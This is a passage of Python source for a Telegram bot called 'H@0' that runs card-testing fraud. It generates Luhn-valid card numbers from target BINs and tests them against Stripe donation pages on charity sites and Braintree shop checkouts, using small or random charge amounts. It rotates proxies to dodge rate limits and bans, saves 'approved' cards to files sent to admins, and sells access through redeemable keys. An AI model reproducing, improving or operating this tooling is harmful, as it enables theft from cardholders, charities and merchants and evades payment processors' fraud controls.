    bar = "▓" * bar_fill + "░" * (bar_len - bar_fill)

    api_icon = "🔴" if rl_stats.get('is_banned') else "🟢"
    api_label = "PAUSED" if rl_stats.get('is_banned') else "ACTIVE"

    msg = (
        f"📊 <b>H@0 SESSION REPORT</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>⏱  UPTIME</b>\n"
        f"🕐 <code>{uptime}</code> · 🔄 <code>{cycles}</code> cycles\n\n"
        f"<b>📋  RESULTS</b>\n"
        f"✅ Approved: <code>{approved}</code>\n"
        f"💰 Charged: <code>{charged}</code>\n"
        f"❌ Declined: <code>{declined}</code>\n"
        f"⚠️ Errors: <code>{errors}</code>\n"
        f"📊 Total: <code>{checked}</code>\n"
        f"📈 Hit Rate: [{bar}] <code>{hit_rate}</code>\n\n"
        f"<b>🛡  GATES</b>\n"
        f"🔌 Stripe {'🟢' if is_gate_enabled('stripe') else '🔴'} · <code>{SESSION_STATS['stripe_checks']}</code> checks\n"
        f"📡 API {api_icon} {api_label} · <code>{rpm}/20</code> RPM\n"
        f"⏳ Limits <code>{rate_limits_count}</code> · Bans <code>{bans_count}</code> · Backoff <code>{backoff}</code>\n\n"
        f"<b>🌐  PROXY POOL</b>\n"
        f"🔗 Pool: <code>{pool}</code> · Live: <code>{scrubbed_live}/{TARGET_LIVE}</code> · Bad: <code>{blacklisted}</code>\n\n"
        f"<b>⚙️  SYSTEM</b>\n"
        f"📂 Configs: <code>{config_count()}/5</code> · Active: <b>#{get_active_config_id()}</b>\n"
        f"🔀 Parallel {'🟢' if is_parallel_enabled() else '🔴'}\n"
        f"🔔 {'🟢' if get_notify('live') else '🔴'} Live  "
        f"{'🟢' if get_notify('decline') else '🔴'} Decline  "
        f"{'🟢' if get_notify('errors') else '🔴'} Errors\n\n"
        f"<code>━━ H@0 V6.0 ━━</code>"
    )

    stats_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📄 Report", callback_data="approved"),
         InlineKeyboardButton(text="🎛 Panel", callback_data="panel")]
    ])

    try:
        await bot.send_message(chat_id, msg, parse_mode='HTML', reply_markup=stats_keyboard)
    except Exception as e:
        logger.error(f"Stats send error: {e}")


async def _send_proxy_file_to_channel(chat_id):
    proxy_file = os.path.join(BASE_DIR, "proxies_live.txt")
    if not os.path.exists(proxy_file) or os.path.getsize(proxy_file) == 0:
        return False, "No live proxies file"
    try:
        with open(proxy_file, 'r') as f:
            lines = [l.strip() for l in f if l.strip()]
        if not lines:
            return False, "Proxy file is empty"

        count = len(lines)
        scrub = get_scrub_stats()
        avg_lat = scrub.get('avg_latency', 0)

        await bot.send_document(
            chat_id,
            InputFile(proxy_file, filename=f"H0_proxies_live_{count}.txt"),
            caption=(
                f"<b>🌐  LIVE PROXIES</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📊 Count: <code>{count}</code>\n"
                f"⚡ Avg Latency: <code>{avg_lat}ms</code>\n"
                f"🔄 Auto-scrubbed & verified\n\n"
                f"<code>━━ H@0 ━━</code>"
            ),
            parse_mode='HTML'
        )
        return True, f"Sent {count} proxies"
    except Exception as e:
        logger.error(f"Send proxy file error: {e}")
        return False, str(e)[:60]


def register_handlers(dp):
    global crawler_instance

    @dp.message_handler(commands=['help'])
    async def cmd_help(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied. Use <code>/redeem [key]</code> to get access.", parse_mode='HTML')
            return

        gate_status = "🟢 ON" if is_gate_enabled("stripe") else "🔴 OFF"
        bot_status = "🟢 RUNNING" if bot_running else "🔴 STOPPED"

        ns = get_all_notify()
        n_live = "🟢" if ns['live'] else "🔴"
        n_dec = "🟢" if ns['decline'] else "🔴"
        n_err = "🟢" if ns['errors'] else "🔴"

        await message.reply(
            "📖 <b>H@0 COMMANDS</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🤖 {bot_status} · 🛡 {gate_status}\n"
            f"🔔 {n_live} Live {n_dec} Decline {n_err} Errors\n\n"
            "⚡ <b>CONTROL</b>\n"
            "/start · /stop · /stats · /report\n\n"
            "🛡 <b>GATE</b>\n"
            "/setupgate <code>[url]</code> · /gate · /setgate\n"
            "/gateon · /gateoff · /chk <code>[cc]</code> · /autofix\n"
            "/hybrid <code>[on|off]</code> — Playwright hybrid mode\n"
            "/masscheck <code>[gate] [limit]</code>\n\n"
            "🌐 <b>PROXY</b>\n"
            "/proxy <code>[on|off]</code> · /addproxy <code>[ip:port]</code>\n"
            "/removeproxy · /proxies · /clearproxies\n"
            "/sendproxies — Send live proxies to channel\n\n"
            "📡 <b>CHANNEL</b>\n"
            "/setchannel · /notify · /panel\n\n"
            "🎯 <b>BIN</b>\n"
            "/setbin <code>[bin]</code> · /msetbin · /removebin\n"
            "/bins · /sendbins · /deletebins\n"
            "/loadcc · /ccstatus\n\n"
            "⚙️ <b>CONFIGS</b>\n"
            "/configs · /editconfig · /setconfig\n"
            "/setupconfig · /fixconfig · /newconfig\n"
            "/dupconfig · /delconfig · /switchconfig\n"
            "/configon · /configoff · /parallel\n"
            "/exportcfg <code>[id]</code> · /importcfg <code>[id]</code>\n\n"
            "📜 <b>SCRIPTS</b>\n"
            "/exportgate <code>[name]</code> — Download script\n"
            "Send <code>.py</code> file — Auto-apply script\n\n"
            "👤 <b>MY CARDS</b>\n"
            "/mycards · /myerrors\n\n"
            "🔑 <b>ACCESS</b>\n"
            "/genkey · /keys · /revokekey · /redeem\n"
            "/addadmin · /removeadmin · /admins\n"
            "/setlimit <code>[cards|users] [num]</code>\n\n"
            "🔑 Admin · 👑 Owner\n\n"
            "<code>━━ H@0 ━━</code>",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎛 Panel", callback_data="panel"),
                 InlineKeyboardButton(text="📊 Stats", callback_data="stats")],
                [InlineKeyboardButton(text="🛡 Gate", callback_data="gate"),
                 InlineKeyboardButton(text="📋 BINs", callback_data="bins")],
                [InlineKeyboardButton(text="🌐 Proxy", callback_data="proxy"),
                 InlineKeyboardButton(text="⚙️ Configs", callback_data="configs")],
                [InlineKeyboardButton(text="▶️ Start", callback_data="start_bot"),
                 InlineKeyboardButton(text="⏹ Stop", callback_data="stop_bot")],
                [InlineKeyboardButton(text="📄 Approved", callback_data="approved"),
                 InlineKeyboardButton(text="🔑 Keys", callback_data="keys")]
            ])
        )

    @dp.message_handler(commands=['start'])
    async def cmd_start(message: Message):
        global bot_running
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        if bot_running:
            await message.reply(
                "<b>ℹ️  ALREADY RUNNING</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "Checker is already active.\n"
                "Use /stop to pause it.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        bot_running = True
        g_icon = "🟢" if is_gate_enabled("stripe") else "🔴"
        g_label = "ON" if is_gate_enabled("stripe") else "OFF"
        logger.info(f"Bot STARTED by admin {message.from_user.id}")
        await message.reply(
            "<b>▶️  CHECKER STARTED</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Checking is now active.\n"
            f"🛡  Gate: {g_icon} {g_label}\n"
            f"🌐  <code>{get_pool_size()}</code> proxies in pool\n"
            f"📋  <code>{len(crawler_instance.bins) if crawler_instance else 0}</code> target BINs\n\n"
            "<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['stop'])
    async def cmd_stop(message: Message):
        global bot_running
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        if not bot_running:
            await message.reply(
                "<b>ℹ️  ALREADY STOPPED</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "Checker is already paused.\n"
                "Use /start to resume.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        bot_running = False
        logger.info(f"Bot STOPPED by admin {message.from_user.id}")
        await message.reply(
            "<b>⏸  CHECKER STOPPED</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Checking is paused.\n"
            "Use /start to resume.\n\n"
            "<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['stats'])
    async def cmd_stats(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        await send_stats_to_channel(message.bot, message.chat.id)

    @dp.message_handler(commands=['report'])
    async def cmd_report(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        approved_file = os.path.join(BASE_DIR, "approved.txt")
        if not os.path.exists(approved_file) or os.path.getsize(approved_file) == 0:
            await message.reply(
                "<b>📄  LIVE REPORT</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "No approved cards yet.\n"
                "Report will be available\n"
                "after first live hit.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        try:
            with open(approved_file, 'r') as f:
                lines = [l.strip() for l in f if l.strip()]
            count = len(lines)

            await message.reply_document(
                InputFile(approved_file, filename=f"H@0_approved_{count}cards.txt"),
                caption=(
                    f"<b>📄  LIVE REPORT</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"✅  <code>{count}</code> approved cards\n"
                    f"⏱  <code>{format_uptime(SESSION_STATS['start_time'])}</code> uptime\n\n"
                    f"<code>━━ H@0 ━━</code>"
                ),
                parse_mode='HTML'
            )
            logger.info(f"Report downloaded by admin {message.from_user.id} ({count} cards)")
        except Exception as e:
            logger.error(f"Report send error: {e}")
            await message.reply("Error sending report. Try again.")

    @dp.message_handler(commands=['approved'])
    async def cmd_approved(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        approved_file = os.path.join(BASE_DIR, "approved.txt")
        if not os.path.exists(approved_file) or os.path.getsize(approved_file) == 0:
            await message.reply(
                "<b>📄  APPROVED CARDS</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "No approved cards yet.\n"
                "File will be available\n"
                "after first live hit.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        try:
            with open(approved_file, 'r') as f:
                lines = [l.strip() for l in f if l.strip()]
            count = len(lines)

            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=f"📥 Download ({count})", callback_data="approved")]
            ])

            await message.reply_document(
                InputFile(approved_file, filename=f"H@0_approved_{count}cards.txt"),
                caption=(
                    f"<b>📄  APPROVED CARDS</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"✅  <code>{count}</code> approved cards\n"
                    f"⏱  <code>{format_uptime(SESSION_STATS['start_time'])}</code> uptime\n\n"
                    f"<code>━━ H@0 ━━</code>"
                ),
                reply_markup=keyboard,
                parse_mode='HTML'
            )
            logger.info(f"Approved file downloaded by admin {message.from_user.id} ({count} cards)")
        except Exception as e:
            logger.error(f"Approved send error: {e}")
            await message.reply("Error sending approved file. Try again.")

    @dp.message_handler(commands=['setbin'])
    async def cmd_setbin(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        args = message.get_args()
        if not args:
            await message.reply(
                "<b>🎯  SET BIN</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "\n<b>USAGE</b>\n"
                "<code>/setbin 524651</code>\n"
                "<code>/setbin 52465100xxxxxxxx</code>\n\n"
                "Use 'x' for random digits\n"
                "Min 4 real digits required\n"
                "All cards are Luhn-valid ✅\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        bin_input = args.strip().replace(' ', '')
        is_valid, reason = is_valid_bin_input(bin_input)
        if not is_valid:
            await message.reply(
                f"<b>❌  INVALID BIN</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{reason}\n\n"
                f"\n<b>FORMAT</b>\n"
                f"<code>/setbin 524651</code>\n"
                f"<code>/setbin 52465100xxxxxxxx</code>\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        if crawler_instance:
            added = crawler_instance.add_bin(bin_input)
            if added:
                display = normalize_bin(bin_input)
                total = len(crawler_instance.bins)
                brand = get_card_brand(display.replace('x', '0')[:6])
                await message.reply(
                    f"<b>✅  BIN ADDED</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🎯  <code>{display}</code>\n"
                    f"📋  Brand: <code>{brand}</code>\n"
                    f"📊  Total BINs: <code>{total}</code>\n"
                    f"✅  Luhn validation active\n\n"
                    f"<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
            else:
                await message.reply(
                    f"<b>ℹ️  BIN EXISTS</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"<code>{normalize_bin(bin_input)}</code> is already\n"
                    f"in the target list.\n\n"
                    f"<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
        else:
            await message.reply("Bot not initialized yet. Try again shortly.")

    @dp.message_handler(commands=['msetbin'])
    async def cmd_msetbin(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        raw_text = message.text or ""
        text_lines = raw_text.strip().splitlines()
        args_lines = text_lines[1:] if len(text_lines) > 1 else []

        inline_args = message.get_args()
        if inline_args:
            args_lines = inline_args.strip().splitlines() + args_lines[len(inline_args.strip().splitlines()):]

        if not args_lines or all(not l.strip() for l in args_lines):
            await message.reply(
                "<b>🎯  MASS SET BIN</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "\n<b>USAGE</b>\n"
                "<code>/msetbin\n"
                "4002712001xxxxxx\n"
                "4059986088xx\n"
                "4141700005\n"
                "519901\n"
                "5400670337</code>\n\n"
                "One BIN per line\n"
                "Use 'x' for random digits\n"
                "Min 4 real digits required\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        if not crawler_instance:
            await message.reply("Bot not initialized yet. Try again shortly.")
            return

        lines = args_lines
        added = 0
        dupes = 0
        invalid_list = []

        for line in lines:
            bin_input = line.strip().replace(' ', '').lower()
            if not bin_input:
                continue

            valid, reason = is_valid_bin_input(bin_input)
            if not valid:
                invalid_list.append(f"{bin_input[:16]} ({reason})")
                continue

            if crawler_instance.add_bin(bin_input):
                added += 1
            else:
                dupes += 1

        total = len(crawler_instance.bins)

        result_msg = (
            "<b>✅  MASS BIN LOAD</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"➕  Added: <code>{added}</code>\n"
            f"🔁  Duplicates: <code>{dupes}</code>\n"
            f"📊  Total BINs: <code>{total}</code>\n"
        )

        if invalid_list:
            inv_display = "\n".join([f"  ❌  <code>{b}</code>" for b in invalid_list[:10]])
            extra = f"\n  ... and {len(invalid_list) - 10} more" if len(invalid_list) > 10 else ""
            result_msg += f"\n<b>INVALID</b>\n{inv_display}{extra}\n"

        result_msg += f"\n<code>━━ H@0 ━━</code>"

        await message.reply(result_msg, parse_mode='HTML')

    @dp.message_handler(commands=['removebin'])
    async def cmd_removebin(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        args = message.get_args()
        if not args:
            await message.reply(
                "Usage: <code>/removebin 524651</code>",
                parse_mode='HTML'
            )
            return

        bin_input = args.strip().replace(' ', '')
        if crawler_instance:
            removed = crawler_instance.remove_bin(bin_input)
            if removed:
                total = len(crawler_instance.bins)
                await message.reply(
                    f"<b>🗑  BIN REMOVED</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"Removed: <code>{normalize_bin(bin_input)}</code>\n"
                    f"📊  Total BINs: <code>{total}</code>\n\n"
                    f"<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
            else:
                await message.reply(
                    f"BIN <code>{normalize_bin(bin_input)}</code> not found in list.",
                    parse_mode='HTML'
                )
        else:
            await message.reply("Bot not initialized yet. Try again shortly.")

    @dp.message_handler(commands=['bins'])
    async def cmd_bins(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        if not crawler_instance or not crawler_instance.bins:
            await message.reply(
                "<b>📋  BIN LIST</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "No BINs loaded.\n"
                "Use /setbin to add some.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        total = len(crawler_instance.bins)
        visa_count = sum(1 for b in crawler_instance.bins if b.replace('x', '0').startswith('4'))
        mc_count = sum(1 for b in crawler_instance.bins if b.replace('x', '0').startswith('5'))
        amex_count = sum(1 for b in crawler_instance.bins if b.replace('x', '0').startswith(('34', '37')))
        disc_count = sum(1 for b in crawler_instance.bins if b.replace('x', '0').startswith('6'))
        pattern_count = sum(1 for b in crawler_instance.bins if 'x' in b)

        sample = sorted(crawler_instance.bins)[:15]
        sample_str = "\n".join(f"  <code>{b}</code>" for b in sample)
        more = f"\n  ... and {total - 15} more" if total > 15 else ""

        await message.reply(
            f"<b>📋  BIN LIST</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📊  Total: <code>{total}</code> BINs\n"
            f"💳  Visa: <code>{visa_count}</code>  ·  MC: <code>{mc_count}</code>\n"
            f"💎  Amex: <code>{amex_count}</code>  ·  Disc: <code>{disc_count}</code>\n"
            f"🔀  Patterns (x): <code>{pattern_count}</code>\n\n"
            f"\n<b>SAMPLE</b>\n"
            f"{sample_str}{more}\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['sendbins'])
    async def cmd_sendbins(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        bins_file = os.path.join(BASE_DIR, "bin.txt")
        if not os.path.exists(bins_file) or os.path.getsize(bins_file) == 0:
            await message.reply(
                "<b>📄  BINS FILE</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "No bins file found.\n"
                "Use /setbin to add BINs.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        try:
            total = len(crawler_instance.bins) if crawler_instance else 0
            await message.reply_document(
                InputFile(bins_file, filename=f"H@0_bins_{total}.txt"),
                caption=(
                    f"<b>📄  BINS FILE</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊  <code>{total}</code> target BINs\n\n"
                    f"<code>━━ H@0 ━━</code>"
                ),
                parse_mode='HTML'
            )
            logger.info(f"Bins file sent to admin {message.from_user.id}")
        except Exception as e:
            logger.error(f"Bins file send error: {e}")
            await message.reply("Error sending bins file. Try again.")

    @dp.message_handler(commands=['deletebins'])
    async def cmd_deletebins(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        if not crawler_instance:
            await message.reply("Bot not initialized yet. Try again shortly.")
            return

        old_count = len(crawler_instance.bins)
        crawler_instance.bins = []
        bins_file = os.path.join(BASE_DIR, "bin.txt")
        try:
            with open(bins_file, 'w') as f:
                f.write('')
            logger.info(f"All BINs deleted by admin {message.from_user.id} (was {old_count})")
        except Exception as e:
            logger.error(f"Delete bins file error: {e}")

        await message.reply(
            f"<b>🗑  BINS DELETED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Removed <code>{old_count}</code> BINs.\n"
            f"BIN list is now empty.\n"
            f"Use /setbin to add new ones.\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['loadcc', 'reloadcc'])
    async def cmd_loadcc(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        if not crawler_instance:
            await message.reply("Bot not initialized yet.")
            return
        count = crawler_instance.reload_cc_file()
        await message.reply(
            f"<b>📂  TEST FILE RELOADED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📊  Loaded <code>{count}</code> cards\n"
            f"📄  Source: <code>livescc.txt</code>\n"
            f"🔧  Use <code>/chk CC|MM|YY|CVV</code> to test\n"
            f"     gate with cards from this file.\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['ccstatus'])
    async def cmd_ccstatus(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        if not crawler_instance:
            await message.reply("Bot not initialized yet.")
            return
        total = len(crawler_instance.cc_list)
        await message.reply(
            f"<b>📊  TEST FILE STATUS</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📄  File: <code>livescc.txt</code>\n"
            f"📊  Total cards: <code>{total}</code>\n"
            f"🔧  Purpose: Gate testing only\n"
            f"🔄  Bot source: <b>BIN Generation</b>\n\n"
            f"<code>/loadcc</code> · Reload file\n"
            f"<code>/chk CC|MM|YY|CVV</code> · Test gate\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['gate'])
    async def cmd_gate(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        active_cid = get_active_config_id()
        active_cfg = get_config(active_cid) or {}
        gate_type = active_cfg.get("gate_type", "stripe")
        settings = active_cfg.get("settings", {})
        enabled = active_cfg.get("enabled", False)
        status_icon = "🟢" if enabled else "🔴"
        status_text = "ON" if enabled else "OFF"
        site = settings.get('site_url', 'Not set')

        rl = get_rate_limiter()
        rl_stats = rl.get_stats()
        rpm = rl_stats.get('requests_in_window', 0)
        api_ok = "🟢 CLEAR" if not rl_stats.get('is_banned') else "🔴 BANNED"

        settings_block = f"\n<b>SETTINGS ({gate_type.upper()})</b>\n" + _fmt_gate_settings(settings, gate_type)

        cc_total = len(crawler_instance.cc_list) if crawler_instance else 0

        await message.reply(
            f"<b>🛡  GATE CONFIG #{active_cid}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{status_icon}  Gate: <b>{gate_type.upper()} {status_text}</b>\n"
            f"⚡  API: <code>{api_ok}</code>  ·  <code>{rpm}/20 RPM</code>\n"
            f"🔄  Source: <code>BIN Generation</code>\n"
            f"📄  Test file: <code>{cc_total} cards</code> in livescc.txt\n\n"
            f"{settings_block}\n"
            f"\n<b>CONFIGURE</b>\n"
            f"<code>/editconfig {active_cid}</code> · Full edit\n"
            f"<code>/gateon</code>  /  <code>/gateoff</code>\n"
            f"<code>/configs</code> · All configs\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🟢 Gate ON", callback_data="gateon"),
                 InlineKeyboardButton(text="🔴 Gate OFF", callback_data="gateoff")],
                [InlineKeyboardButton(text="⚙️ Configs", callback_data="configs"),
                 InlineKeyboardButton(text="🎛 Panel", callback_data="panel")]
            ])
        )

    @dp.message_handler(commands=['setgate'])
    async def cmd_setgate(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        active_cid = get_active_config_id()
        active_cfg = get_config(active_cid) or {}
        current_gt = active_cfg.get("gate_type", "stripe")
        gt_label = "Braintree" if current_gt == "braintree" else "Stripe"

        args = message.get_args()
        if not args or ' ' not in args.strip():
            if current_gt == "braintree":
                help_msg = (
                    f"<b>⚙️  SET GATE — {gt_label}</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n\n"
                    "<b>⚡  EASIEST WAY</b>\n"
                    "<code>/setupgate https://shop.com</code>\n"
                    "<i>Auto-detects everything!</i>\n\n"
                    "<b>🔧  MANUAL SETTINGS</b>\n"
                    "<code>/setgate site [url]</code>\n"
                    "<code>/setgate cart [path]</code>\n"
                    "<code>/setgate checkout [path]</code>\n"
                    "<code>/setgate paymethod [id]</code>\n"
                    "<code>/setgate product [json]</code>\n\n"
                    "<b>📌  EXAMPLES</b>\n"
                    "<code>/setgate site https://huckberry.com</code>\n"
                    "<code>/setgate cart /orders/populate</code>\n"
                    "<code>/setgate checkout /checkout/onepage</code>\n"
                    "<code>/setgate paymethod 3</code>\n\n"
                    "<code>━━ H@0 ━━</code>"
                )
            else:
                help_msg = (
                    f"<b>⚙️  SET GATE — {gt_label}</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n\n"
                    "<b>⚡  EASIEST WAY</b>\n"
                    "<code>/setupgate https://charity.org</code>\n"
                    "<i>Auto-detects everything!</i>\n\n"
                    "<b>🔧  MANUAL SETTINGS</b>\n"
                    "<code>/setgate site [url]</code>\n"
                    "<code>/setgate path [donate path]</code>\n"
                    "<code>/setgate amount [amt]</code>\n"
                    "<code>/setgate randomamt [on|off]</code>\n"
                    "<code>/setgate minamount [amt]</code>\n"
                    "<code>/setgate maxamount [amt]</code>\n\n"
                    "<b>🔧  OVERRIDE (auto-detected)</b>\n"
                    "<code>/setgate key [pub_key]</code>\n"
                    "<code>/setgate account [id]</code>\n"
                    "<code>/setgate campaign [id]</code>\n\n"
                    "<b>📌  EXAMPLES</b>\n"
                    "<code>/setgate site https://donate.org</code>\n"
                    "<code>/setgate amount 1.00</code>\n"
                    "<code>/setgate randomamt on</code>\n\n"
                    "<code>━━ H@0 ━━</code>"
                )
            await message.reply(help_msg, parse_mode='HTML')
            return

        parts = args.strip().split(None, 1)
        setting_key = parts[0].lower()
        setting_value = parts[1].strip() if len(parts) > 1 else ""

        if setting_key == 'randomamt':
            enabled = setting_value.lower() in ('on', 'true', '1', 'yes')
            set_gate_setting("stripe", "random_amount", enabled)
            set_config_setting(active_cid, "random_amount", enabled)
            icon = "🟢 ON" if enabled else "🔴 OFF"
            min_v = get_gate_setting("stripe", "random_amount_min", "1.00")
            max_v = get_gate_setting("stripe", "random_amount_max", "5.00")
            await message.reply(
                f"<b>✅  RANDOM AMOUNT {icon}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🎲  Random: <b>{icon}</b>\n"
                f"📉  Min: <code>${min_v}</code>\n"
                f"📈  Max: <code>${max_v}</code>\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        if setting_key in ('minamount', 'maxamount', 'amount'):
            try:
                val = float(setting_value)
                if val <= 0:
                    raise ValueError("Must be positive")
            except (ValueError, TypeError):
                await message.reply(f"❌ Invalid amount: <code>{setting_value}</code>\nMust be a positive number (e.g. 1.00)", parse_mode='HTML')
                return
            setting_value = f"{val:.2f}"

        stripe_key_map = {
            'site': ('site_url', '🌐 Site URL', 'stripe'),
            'url': ('site_url', '🌐 Site URL', 'stripe'),
            'path': ('donate_path', '📄 Donate Path', 'stripe'),
            'amount': ('donation_amount', '💰 Amount', 'stripe'),
            'minamount': ('random_amount_min', '📉 Min Amount', 'stripe'),
            'maxamount': ('random_amount_max', '📈 Max Amount', 'stripe'),
            'key': ('pub_key', '🔑 Pub Key', 'stripe'),
            'pubkey': ('pub_key', '🔑 Pub Key', 'stripe'),
            'account': ('stripe_account', '🏷 Account', 'stripe'),
            'acct': ('stripe_account', '🏷 Account', 'stripe'),
            'campaign': ('campaign_id', '📋 Campaign', 'stripe'),
        }

        bt_key_map = {
            'site': ('site_url', '🌐 Site URL', 'braintree'),
            'url': ('site_url', '🌐 Site URL', 'braintree'),
            'cart': ('add_to_cart_path', '🛒 Cart Path', 'braintree'),
            'cartpath': ('add_to_cart_path', '🛒 Cart Path', 'braintree'),
            'checkout': ('checkout_path', '💳 Checkout Path', 'braintree'),
            'checkoutpath': ('checkout_path', '💳 Checkout Path', 'braintree'),
            'paymethod': ('payment_method_id', '🆔 Payment Method', 'braintree'),
            'paymethodid': ('payment_method_id', '🆔 Payment Method', 'braintree'),
            'product': ('product_payload', '📦 Product Payload', 'braintree'),
        }

        key_map = bt_key_map if current_gt == "braintree" else stripe_key_map
        combined_map = {**stripe_key_map, **bt_key_map}

        if setting_key in key_map:
            config_key, display_name, gate_scope = key_map[setting_key]
        elif setting_key in combined_map:
            config_key, display_name, gate_scope = combined_map[setting_key]
        else:
            valid_keys = ', '.join(key_map.keys())
            await message.reply(
                f"❌ Unknown setting: <code>{setting_key}</code>\n\n"
                f"Active gate: <b>{gt_label}</b>\n"
                f"Valid settings: <code>{valid_keys}</code>\n\n"
                f"<i>Use /setgate to see all options</i>",
                parse_mode='HTML'
            )
            return

        set_gate_setting(gate_scope, config_key, setting_value)
        set_config_setting(active_cid, config_key, setting_value)
        logger.info(f"Gate config updated by {message.from_user.id}: [{gate_scope}] {config_key} = {setting_value[:50]}")

        await message.reply(
            f"<b>✅  {gt_label.upper()} GATE UPDATED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{display_name}:\n"
            f"<code>{setting_value}</code>\n\n"
            f"Use /gate to see full config.\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['gateon'])
    async def cmd_gateon(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        active_cid = get_active_config_id()
        active_cfg = get_config(active_cid) or {}
        gt = active_cfg.get("gate_type", "stripe")
